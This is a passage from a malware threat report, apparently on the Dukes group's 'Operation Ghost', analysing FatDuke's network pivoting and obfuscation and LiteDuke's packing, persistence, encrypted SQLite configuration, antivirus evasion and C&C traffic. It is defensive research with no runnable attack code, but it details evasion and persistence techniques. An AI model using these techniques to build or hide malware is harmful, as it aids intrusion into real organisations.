+For example, they registered the domain ~~fairfeldsch[.]org~~ i and make it redirect
+to ~~fairfelds.northants.sch.uk~~ i, the website of a school in the UK.
+We also noticed that they used several C&C servers per targeted organization, but these servers apparently
+don’t overlap across the victims, ensuring tight compartmentalization.
+29 Operation Ghost The Dukes aren’t back – they never left
+Local network pivoting
+What if the compromised machine doesn’t have access, or has restricted access, to the Internet? The
+developers implemented a functionality they called ~~PivotingPipeTransport.~~
+It allows the malware to communicate with other malware instances using pipes. In order to connect to a
+remote machine, it first calls WNetAddConnection2 . This function takes the following arguments:
+   - ~~`lpNetResource`~~ ~~:~~ the remote machine
+
+
+   - ~~`lpPassword`~~ ~~:~~ the remote password
+
+
+   - ~~`lpUserName`~~ ~~:~~ the remote username
+
+These pieces of information are available in the malware configuration under the names:
+   - ~~`pivoting_ip`~~
+
+
+   - ~~`pivoting_login`~~
+
+
+   - ~~`pivoting_password`~~
+
+Then, it will create a pipe using the name specified in the ~~pivoting_pipe~~ configuration field and use it to
+communicate with the other malware instance.
+Thus, this functionality allows attackers to bypass network restrictions that may be enforced on critical
+systems. However, they need to steal the credentials of the remote machine first or use organization-level
+administrative credentials.
+Obfuscation
+The FatDuke binaries are highly obfuscated. They use three different techniques in order to slow down
+analysis.
+First, they use string stacking for all important strings; this consists of building strings dynamically by pushing
+each character separately on the stack, rather than using strings from the ~~.data~~ section. They also add
+some basic operations to the stacking in order to prevent the extraction without emulating the code. Figure 34
+shows such an example where the ASCII value of each letter is multiplied with a hardcoded value of 1.
+Figure 34 // FatDuke obfuscation – String stacking
+Second, they also add opaque predicates in most of the functions. Opaque predicates are conditions that are
+always True or always False. They are not part of the code's semantic, but the code is harder to read.
+Figure 35 is an example of opaque predicates we found in FatDuke. Whatever the result of ~~rand()~~ is, ~~v11~~ is
+always equal to 15. Thus, the condition is always False.
+Figure 35 // FatDuke obfuscation – Opaque predicate
+30 Operation Ghost The Dukes aren’t back – they never left
+Third, they add junk code and junk strings. Unlike opaque predicates, the code will be executed
+but it is useless and again is not part of the semantics of the program. For example, the function in Figure 36
+and in Figure 37 returns always the same value, which is never used.
+Figure 36 // FatDuke obfuscation – Junk function call
+Figure 37 // FatDuke obfuscation – Junk function return value
+The binary contains a huge amount of strings from different projects like Chromium. It might be an attempt
+to bypass security products, similar to what was posted by SkyLight [27] . These strings are used to fill very
+large structures (about 1000 fields), probably to hide the few interesting fields used by the malware, as
+shown in Figure 38.
+Figure 38 // FatDuke obfuscation – Chromium strings
+We are not sure whether Dukes’ developers used a commercial obfuscation tool or if they developed
+their own. However, given their level of sophistication, it would not be surprising if they rely on their
+own obfuscator.
+31 Operation Ghost The Dukes aren’t back – they never left
+4.6 LiteDuke: the former third stage
+LiteDuke is a third-stage backdoor that was mainly used in 2014-2015. It is not directly linked to Operation
+Ghost, but we found it on some machines compromised by MiniDuke. We chose to document it mainly
+because we did not find it described elsewhere. We have dubbed it LiteDuke because it uses SQLite
+to store information such as its configuration. Our analysis is based on the sample with SHA-1
+~~AF2B46D4371CE632E2669FEA1959EE8AF4EC39CE~~ ~~.~~
+Link with the Dukes
+LiteDuke uses the same dropper as PolyglotDuke. It also uses the same encryption scheme, shown in
+Figure 7 in section 3.2, to obfuscate its strings. As we haven’t seen any other threat actor using the same code,
+we are confident that LiteDuke was indeed part of the Dukes’ arsenal.
+Packer
+LiteDuke is packed using several layers of encryption and steganography.
+
+In the PE resources section, the initial dropper has a GIF picture. The picture is not valid but contains
+
+a second dropper.
+
+This second executable has a BMP picture in its resources. It uses steganography to hide bytes
+
+in the image. Once decoded and decrypted, we have the loader.
+
+The loader will decrypt the backdoor code and load it into memory.
+
+Figure 39 summarizes the unpacking process from the initial dropper to the backdoor code.
+Loader
+Dropper 1
+Dropper 2
+GIF picture
+(invalid)
+BMP picture
+(with data hidden
+using steganography)
+Figure 39 // LiteDuke unpacking process
+Backdoor
+Side Story
+We also noticed that the attackers left a curious artefact in an older sample (the dropper with SHA-1
+7994714FFDD6411A6D64A7A6371DB9C529E70C37 ) as shown in Figure 40.
+Figure 40 // Curious phone number left by the attackers
+This is the phone number of a mental health specialist in a small city in the state of Indiana
+in the United States.
+32 Operation Ghost The Dukes aren’t back – they never left
+Backdoor
+The backdoor code only exists in memory as only the loader is written to disk. The loader persists using
+a Windows shortcut ~~(~~ ~~.lnk~~ file) that is registered in the traditional ~~CurrentVersion\Run~~ registry key.
+According to the PE header, the developers did not make use of Visual Studio to compile this backdoor.
+Figure 41 shows that they used the linker FASM 1.70. FASM (Flat Assembler) is an assembler that can produce
+Windows or Linux binaries. It reminds us of the MiniDuke backdoor, developed directly in x86 assembly.
+Figure 41 // Assembler used by the developer (screenshot of DIE analysis)
+The backdoor DLL exports seven functions that have relatively explicit names (CC being Crypto Container):
+   - SendBin
+
+
+   - LoadFromCC
+
+
+   - SaveToCC
+
+
+   - GetDBHandle
+
+
+   - GetCCFieldSize
+
+
+   - GetCCFieldLn
+
+
+   - DllEntryPoint
+
+Interestingly, the malware apparently attempts to bypass Kaspersky security products by checking
+if the registry key ~~HKCU\Software\KasperskyLab~~ exists and if so, it waits 30 seconds before executing
+any additional code. We do not know whether this really bypasses any Kaspersky security products.
+The Crypto Container is an SQLite database, stored on the disk in the same directory as the loader,
+and uses SQLCipher . This SQLite extension encrypts the database using AES-256. The encryption key is the
+MD5 hash of machine-specific values (such as CPUID, the account name, the BIOS version and the processor
+name) to prevent decryption if, for example, the database ends up in a public malware repository. The key
+is not stored anywhere but is re-generated at each execution.
+The database contains three different tables, which are created using the following commands:
+CREATE TABLE modules (uid INTEGER PRIMARY KEY, version char(255),
+code blob, config blob, type char(10), md5sum char(32), autorun
+(INTEGER);
+CREATE TABLE objects (uid INTEGER PRIMARY KEY AUTOINCREMENT, name
+CHAR(255), body blob, type char(10), md5sum char(32));
+CREATE TABLE config (uid INTEGER PRIMARY KEY AUTOINCREMENT, agent_id
+CHAR(128), remote_host CHAR(256), remote_port integer, remote_path
+char(1024), update_interval integer, server_key CHAR(32), rcv_header
+```
+             CHAR(64));
+```
+The configuration default values are hardcoded in the binary. This SQLite table allows the malware
+operators to update these parameters easily.
+Similarly, the modules, which are plug-ins for the backdoor, are stored in the database. Since the database
+is encrypted, the modules never touch the disk in plaintext and will only be loaded into memory.
+Unfortunately, we have not yet been able to find any of the plug-ins used by LiteDuke.
+One artefact of the development method is the implementation of the backdoor commands. Usually,
+a backdoor will have a big switch statement to check the command sent by the C&C server against the list
+of commands implemented in the malware. In the case of LiteDuke, it is a succession of loops: one loop per
+implemented command, as shown in Figure 42.
+33 Operation Ghost The Dukes aren’t back – they never left
+Figure 42 // Multiple while loops instead of a backdoor switch case
+Each of the 41 different commands has between three and six possible command IDs. The program will loop
+successively on the list until the ID in the list matches the ID provided by the operator. The full list is available
+in Figure 43.
+Figure 43 // List of LiteDuke command IDs
+Given the large number of different commands, we won’t list them all. Basically, the backdoor can:
+   - Upload or download files
+
+   - Securely delete a file by first writing random data (from a linear congruential generator) to the file
+
+   - Update the database (config, modules and objects)
+
+
+   - Create a process
+
+
+   - Get system information (CPUID, BIOS version, account name, etc.)
+
+
+   - Terminate itself
+
+The network part of the backdoor is relatively simple. It uses GET requests to contact either the hardcoded
+C&C URL or the one stored in the database. Figure 44 shows the domain, resources and parameters used
+by LiteDuke.
+34 Operation Ghost The Dukes aren’t back – they never left
+Figure 44 // LiteDuke C&C domain, resources and parameters
+Among the different samples we analyzed, the C&C domains are different, but they always use a script
+named ~~rcv_get.php~~ . We believe that the C&C domains are compromised servers.
+In order to blend into the network traffic, and similar to FatDuke, the malware checks the default browser
+and chooses its User-Agent request header accordingly, as shown in Table 7. It can also get the proxy
+configuration from Firefox, in the configuration file ~~prej.js~~, or from Opera, in the ~~operaprefs.ini~~ file.
+This information is then used when establishing a connection to the C&C server.
+~~Table 7~~ ~~User-Agent strings used by LiteDuke~~
+Default Browser User-Agent
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0;
+Internet Explorer
+SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729)
+Mozilla/5.0 (Windows NT 6.2; WOW64; rv:23.0) Gecko/20100101
+Firefox
+Firefox/23.0
+Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebChrome
+Kit/534.13(KHTML, like Gecko) Chrome/9.0.597.98 Safari/534.13
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.19.4
+Safari
+(KHTML, like Gecko) Version/5.0.3 Safari/533.19.4
+Opera Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.7.62 Version/11.01
+As one can see, some of these User-Agents are custom and they all refer to very old browsers, most of them
+released in 2011. It is also way less stealthy than with FatDuke’s sniffing of the real User-Agent used by the
+local browser. This reinforces our hypothesis that this backdoor was used many years ago and is no longer
+deployed in the wild.
